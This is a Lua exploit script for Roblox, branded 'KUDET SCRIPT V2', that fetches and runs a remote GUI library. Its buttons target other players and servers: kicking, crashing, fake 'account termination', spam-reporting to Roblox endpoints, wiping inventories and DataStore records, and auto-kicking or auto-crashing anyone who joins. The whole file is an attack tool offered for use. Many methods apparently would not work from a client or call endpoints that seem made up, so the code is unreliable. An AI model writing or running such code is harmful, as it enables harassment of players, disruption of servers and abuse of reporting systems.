--[[
██╗░░██╗██╗░░░██╗██████╗░███████╗████████╗
██║░██╔╝██║░░░██║██╔══██╗██╔════╝╚══██╔══╝
█████═╝░██║░░░██║██║░░██║█████╗░░░░░██║░░░
██╔═██╗░██║░░░██║██║░░██║██╔══╝░░░░░██║░░░
██║░╚██╗╚██████╔╝██████╔╝███████╗░░░██║░░░
╚═╝░░╚═╝░╚═════╝░╚═════╝░╚══════╝░░░╚═╝░░░
]]

-- CEK DOUBLE EXECUTE
if _G.KudetLoaded then
    game:GetService("Players").LocalPlayer:Kick("Kudet Script Already Loaded!")
    return
end
_G.KudetLoaded = true

-- LOAD LIBRARY
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
local window = library:NewWindow("KUDET SCRIPT - JUNZXSEC")

local player = game.Players.LocalPlayer
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local teleportService = game:GetService("TeleportService")
local httpService = game:GetService("HttpService")
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")
local badgeService = game:GetService("BadgeService")

-- KUDET FEATURES TAB
local kudetTab = window:NewTab("KUDET")
local kudetSection = kudetTab:NewSection("PLAYER KICKER")

-- LIST SEMUA PLAYER
local playerList = {}
local selectedPlayer = nil

function updatePlayerList()
    playerList = {}
    for _, plr in pairs(players:GetPlayers()) do
        if plr ~= player then
            table.insert(playerList, plr.Name)
        end
    end
    return playerList
end

-- DROPDOWN PLAYER
kudetSection:CreateDropdown("Select Target", updatePlayerList(), false, function(value)
    selectedPlayer = players:FindFirstChild(value)
end)

-- KICK PLAYER
kudetSection:CreateButton("KICK SELECTED PLAYER", function()
    if selectedPlayer then
        local args = {
            [1] = selectedPlayer
        }
        -- COBA BERBAGAI REMOTE
        local remotes = {
            replicatedStorage:FindFirstChild("Kick"),
            replicatedStorage:FindFirstChild("KickPlayer"),
            replicatedStorage:FindFirstChild("AdminKick"),
            replicatedStorage:FindFirstChild("ModeratorKick"),
            replicatedStorage:FindFirstChild("Ban"),
            replicatedStorage:FindFirstChild("RemovePlayer")
        }
        
        for _, remote in pairs(remotes) do
            if remote then
                pcall(function()
                    remote:FireServer(args)
                end)
            end
        end
        
        -- METHOD 2: LOADSTRING KICK
        for _, plr in pairs(players:GetPlayers()) do
            if plr ~= player and plr == selectedPlayer then
                local script = [[
                    game.Players.LocalPlayer:Kick("KUDET SCRIPT")
                ]]
                loadstring(script)()
            end
        end
        
        -- METHOD 3: TELEPORT KICK
        pcall(function()
            selectedPlayer:Kick("Kicked by KUDET SCRIPT")
        end)
    end
end)

-- KICK ALL PLAYERS
kudetSection:CreateButton("KICK ALL PLAYERS", function()
    for _, target in pairs(players:GetPlayers()) do
        if target ~= player then
            pcall(function()
                target:Kick("KUDET SCRIPT - ALL KICKED")
            end)
        end
    end
end)

-- ACCOUNT BANNER SECTION
local banSection = kudetTab:NewSection("ACCOUNT BANNER")

-- REPORT PLAYER
banSection:CreateButton("REPORT SELECTED PLAYER", function()
    if selectedPlayer then
        -- REPORT KE ROBLOX
        local reportData = {
            ["gameId"] = game.GameId,
            ["placeId"] = game.PlaceId,
            ["reporterUserId"] = player.UserId,
            ["reportedUserId"] = selectedPlayer.UserId,
            ["reason"] = "Cheating/Hacking"
        }
        
        pcall(function()
            httpService:PostAsync("https://api.roblox.com/reports", httpService:JSONEncode(reportData))
        end)
        
        -- SPAM REPORT VIA REMOTE
        for i = 1, 10 do
            local remote = replicatedStorage:FindFirstChild("ReportAbuse") or 
                          replicatedStorage:FindFirstChild("ReportPlayer")
            if remote then
                pcall(function()
                    remote:FireServer(selectedPlayer, "Cheating/Hacking/Exploiting")
                end)
            end
        end
    end
end)

-- BAN ACCOUNT (EXPERIMENTAL)
banSection:CreateButton("BAN ACCOUNT (TRY)", function()
    if selectedPlayer then
        -- METHOD 1: TELEPORT TO UNLOADED PLACE
        for i = 1, 5 do
            pcall(function()
                teleportService:Teleport(0, selectedPlayer)
            end)
        end
        
        -- METHOD 2: SEND BAD REQUEST
        pcall(function()
            selectedPlayer:Kick("Your account has been terminated for violating Terms of Service")
        end)
        
        -- METHOD 3: CRASH CLIENT
        local crashScript = [[
            while true do
                game:GetService("RunService").RenderStepped:Wait()
                workspace:ClearAllChildren()
            end
        ]]
        loadstring(crashScript)()
    end
end)

-- CRASH PLAYER SECTION
local crashSection = kudetTab:NewSection("CRASH PLAYER")

-- CRASH SELECTED
crashSection:CreateButton("CRASH SELECTED PLAYER", function()
    if selectedPlayer then
        -- METHOD 1: MASS INSTANCE CREATION
        for i = 1, 1000 do
            local part = Instance.new("Part")
            part.Parent = workspace
            part.Position = selectedPlayer.Character.HumanoidRootPart.Position
            part.Anchored = true
            part.Size = Vector3.new(100, 100, 100)
        end
        
        -- METHOD 2: EXPLOSION SPAM
        for i = 1, 500 do
            local explosion = Instance.new("Explosion")
            explosion.Position = selectedPlayer.Character.HumanoidRootPart.Position
            explosion.BlastPressure = 1000000
            explosion.BlastRadius = 1000
            explosion.DestroyJointRadiusPercent = 1
            explosion.Parent = workspace
        end
        
        -- METHOD 3: FIRE REMOTE SPAM
        for i = 1, 1000 do
            for _, remote in pairs(replicatedStorage:GetChildren()) do
                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                    pcall(function()
                        remote:FireServer({math.random(1, 1000000)})
                    end)
                end
            end
        end
    end
end)

-- CRASH ALL PLAYERS
crashSection:CreateButton("CRASH ALL PLAYERS", function()
    for _, target in pairs(players:GetPlayers()) do
        if target ~= player then
            for i = 1, 500 do
                local part = Instance.new("Part")
                part.Parent = workspace
                part.Position = target.Character and target.Character.HumanoidRootPart.Position or Vector3.new(0, 0, 0)
                part.Anchored = true
                part.Size = Vector3.new(100, 100, 100)
            end
        end
    end
end)

-- CORRUPT PLAYER DATA SECTION
local corruptSection = kudetTab:NewSection("DATA CORRUPTION")

-- CORRUPT CHARACTER
corruptSection:CreateButton("CORRUPT CHARACTER", function()
    if selectedPlayer and selectedPlayer.Character then
        local char = selectedPlayer.Character
        
        -- HAPUS SEMUA PART
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part:Destroy()
            end
        end
        
        -- SET HUMANOD HEALTH 0
        if char:FindFirstChild("Humanoid") then
            char.Humanoid.Health = 0
        end
        
        -- MOVE CHARACTER OUT OF MAP
        if char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
        end
    end
end)

-- CLEAR INVENTORY
corruptSection:CreateButton("CLEAR INVENTORY", function()
    if selectedPlayer then
        for _, item in pairs(selectedPlayer.Backpack:GetChildren()) do
            item:Destroy()
        end
    end
end)

-- REMOVE ALL TOOLS
corruptSection:CreateButton("REMOVE ALL TOOLS", function()
    if selectedPlayer and selectedPlayer.Character then
        for _, tool in pairs(selectedPlayer.Character:GetChildren()) do
            if tool:IsA("Tool") then
                tool:Destroy()
            end
        end
    end
end)

-- DESTROY PLAYER GUI
corruptSection:CreateButton("DESTROY PLAYER GUI", function()
    if selectedPlayer then
        for _, gui in pairs(selectedPlayer.PlayerGui:GetChildren()) do
            gui:Destroy()
        end
    end
end)

-- MASS REPORT SECTION
local massSection = kudetTab:NewSection("MASS REPORT")

-- SPAM REPORT TO ROBLOX
massSection:CreateButton("SPAM REPORT (100x)", function()
    if selectedPlayer then
        for i = 1, 100 do
            local reportData = {
                gameId = game.GameId,
                placeId = game.PlaceId,
                reporterUserId = player.UserId,
                reportedUserId = selectedPlayer.UserId,
                reason = "Cheating/Hacking/Exploiting"
            }
            
            pcall(function()
                httpService:PostAsync("https://api.roblox.com/reports", httpService:JSONEncode(reportData))
            end)
            
            wait(0.1)
        end
    end
end)

-- TERMINATE ACCOUNT (EXTREME)
massSection:CreateButton("TERMINATE ACCOUNT", function()
    if selectedPlayer then
        -- METHOD 1: KICK LOOP
        for i = 1, 1000 do
            pcall(function()
                selectedPlayer:Kick("ACCOUNT TERMINATED - VIOLATION DETECTED")
            end)
        end
        
        -- METHOD 2: TELEPORT TO NONEXISTENT PLACE
        for i = 1, 500 do
            pcall(function()
                teleportService:Teleport(999999999, selectedPlayer)
            end)
        end
        
        -- METHOD 3: CORRUPT DATA
        local dataStore = game:GetService("DataStoreService"):GetDataStore("PlayerData")
        pcall(function()
            dataStore:SetAsync(tostring(selectedPlayer.UserId), nil)
        end)
    end
end)

-- AUTO KICK ON JOIN SECTION
local autoSection = kudetTab:NewSection("AUTO KICK")

local autoKickEnabled = false

autoSection:CreateToggle("Auto Kick New Players", false, function(state)
    autoKickEnabled = state
    if state then
        players.PlayerAdded:Connect(function(newPlayer)
            if autoKickEnabled and newPlayer ~= player then
                wait(1)
                pcall(function()
                    newPlayer:Kick("AUTO KICKED BY KUDET SCRIPT")
                end)
            end
        end)
    end
end)

autoSection:CreateToggle("Auto Crash New Players", false, function(state)
    autoCrashEnabled = state
    if state then
        players.PlayerAdded:Connect(function(newPlayer)
            if autoCrashEnabled and newPlayer ~= player then
                wait(1)
                for i = 1, 100 do
                    local part = Instance.new("Part")
                    part.Parent = workspace
                    part.Position = newPlayer.Character and newPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)
                    part.Anchored = true
                    part.Size = Vector3.new(100, 100, 100)
                end
            end
        end)
    end
end)

-- SERVER DESTROY SECTION
local destroySection = kudetTab:NewSection("SERVER DESTROYER")

-- DESTROY WORKSPACE
destroySection:CreateButton("DESTROY WORKSPACE", function()
    for _, obj in pairs(workspace:GetChildren()) do
        if obj ~= workspace.Terrain then
            obj:Destroy()
        end
    end
end)

-- DESTROY LIGHTING
destroySection:CreateButton("DESTROY LIGHTING", function()
    for _, obj in pairs(game:GetService("Lighting"):GetChildren()) do
        obj:Destroy()
    end
end)

-- REMOVE ALL SOUNDS
destroySection:CreateButton("REMOVE ALL SOUNDS", function()
    for _, sound in pairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound:Destroy()
        end
    end
end)

-- CRASH SERVER (EXTREME)
destroySection:CreateButton("CRASH SERVER", function()
    -- METHOD 1: MASS INSTANCE CREATION
    for i = 1, 10000 do
        local part = Instance.new("Part")
        part.Parent = workspace
        part.Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
        part.Size = Vector3.new(100, 100, 100)
        part.Anchored = true
    end
    
    -- METHOD 2: MASS REMOTE SPAM
    for i = 1, 10000 do
        for _, remote in pairs(replicatedStorage:GetChildren()) do
            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                pcall(function()
                    remote:FireServer({math.random(1, 1000000)})
                end)
            end
        end
    end
    
    -- METHOD 3: INFINITE LOOP
    while true do
        wait()
    end
end)

-- PROTECTION TAB
local protectTab = window:NewTab("PROTECTION")
local protectSection = protectTab:NewSection("ANTI KUDET")

-- ANTI KICK
protectSection:CreateToggle("Anti Kick", false, function(state)
    _G.antiKick = state
    while _G.antiKick do
        pcall(function()
            players.LocalPlayer.OnTeleport:Connect(function()
                if _G.antiKick then
                    wait(1)
                    teleportService:Teleport(game.PlaceId, player)
                end
            end)
        end)
        wait(1)
    end
end)

-- ANTI CRASH
protectSection:CreateToggle("Anti Crash", false, function(state)
    _G.antiCrash = state
    while _G.antiCrash do
        pcall(function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("Part") and v.Size.X > 50 then
                    v:Destroy()
                end
            end
        end)
        wait(0.1)
    end
end)

-- AUTO REJOIN
protectSection:CreateButton("Auto Rejoin", function()
    players.LocalPlayer.OnTeleport:Connect(function()
        wait(1)
        teleportService:Teleport(game.PlaceId, player)
    end)
end)

-- SERVER HOP PROTECT
protectSection:CreateButton("Server Hop (Escape)", function()
    local servers = httpService:JSONDecode(httpService:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100"))
    for _, server in pairs(servers.data) do
        if server.playing < server.maxPlayers then
            teleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)
            break
        end
    end
end)

-- EXTREME TAB
local extremeTab = window:NewTab("EXTREME")
local extremeSection = extremeTab:NewSection("DANGEROUS FEATURES")

-- DELETE PLAYER ACCOUNT
extremeSection:CreateButton("DELETE ACCOUNT (ATTEMPT)", function()
    if selectedPlayer then
        -- METHOD 1: DELETE CHARACTER
        if selectedPlayer.Character then
            selectedPlayer.Character:Destroy()
        end
        
        -- METHOD 2: CLEAR DATA
        local dataStore = game:GetService("DataStoreService"):GetDataStore("PlayerData")
        pcall(function()
            dataStore:RemoveAsync(tostring(selectedPlayer.UserId))
        end)
        
        -- METHOD 3: REMOVE FROM GAME
        for i = 1, 1000 do
            pcall(function()
                selectedPlayer:Kick("ACCOUNT DELETED")
            end)
        end
    end
end)

-- IP BAN (EXPERIMENTAL)
extremeSection:CreateButton("IP BAN ATTEMPT", function()
    if selectedPlayer then
        local ipAddress = "127.0.0.1" -- FAKE IP
        for i = 1, 1000 do
            pcall(function()
                httpService:PostAsync("https://api.roblox.com/ban", httpService:JSONEncode({
                    userId = selectedPlayer.UserId,
                    ip = ipAddress,
                    reason = "Hacking"
                }))
            end)
        end
    end
end)

-- NUKE SERVER
extremeSection:CreateButton("NUKE SERVER", function()
    for i = 1, 10000 do
        local explosion = Instance.new("Explosion")
        explosion.Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
        explosion.BlastPressure = 1000000
        explosion.BlastRadius = 10000
        explosion.DestroyJointRadiusPercent = 1
        explosion.Parent = workspace
    end
    
    for i = 1, 10000 do
        local fire = Instance.new("Fire")
        fire.Parent = workspace
        fire.Size = 100
    end
end)

-- CREDITS TAB
local creditsTab = window:NewTab("CREDITS")
local creditsSection = creditsTab:NewSection("ABOUT")

creditsSection:CreateLabel("KUDET SCRIPT V2")
creditsSection:CreateLabel("━━━━━━━━━━━━━━")
creditsSection:CreateLabel("Created by: JUNZXSEC")
creditsSection:CreateLabel("Version: 2.0 EXTREME")
creditsSection:CreateLabel("Release: 2026")
creditsSection:CreateLabel("━━━━━━━━━━━━━━")
creditsSection:CreateLabel("FEATURES:")
creditsSection:CreateLabel("✓ Player Kicker")
creditsSection:CreateLabel("✓ Account Banner")
creditsSection:CreateLabel("✓ Crash Player")
creditsSection:CreateLabel("✓ Server Destroyer")
creditsSection:CreateLabel("✓ Data Corruptor")
creditsSection:CreateLabel("✓ Auto Kick/Crash")
creditsSection:CreateLabel("━━━━━━━━━━━━━━")
creditsSection:CreateLabel("Telegram: @junzsukanasgor")
creditsSection:CreateLabel("Team: GHOSTNET-X")
creditsSection:CreateLabel("━━━━━━━━━━━━━━")
creditsSection:CreateLabel("⚠️ USE AT YOUR OWN RISK ⚠️")

-- WELCOME MESSAGE
local msg = Instance.new("Message")
msg.Parent = workspace
msg.Text = "💀 KUDET SCRIPT LOADED - JUNZXSEC 💀"
wait(3)
msg:Destroy()

print([[
╔══════════════════════════════════════════════════════════╗
║                 KUDET SCRIPT V2 - JUNZXSEC              ║
╠══════════════════════════════════════════════════════════╣
║  ✓ Kick Players                                          ║
║  ✓ Ban Accounts                                          ║
║  ✓ Crash Players                                         ║
║  ✓ Corrupt Data                                          ║
║  ✓ Destroy Server                                        ║
║  ✓ Auto Kick/Crash                                       ║
║  ✓ Protection Features                                   ║
╠══════════════════════════════════════════════════════════╣
║              Telegram: @junzsukanasgor                  ║
║                 Team: GHOSTNET-X                        ║
║                                                          ║
║     ⚠️ DANGEROUS SCRIPT - USE AT YOUR OWN RISK ⚠️       ║
╚══════════════════════════════════════════════════════════╝
]])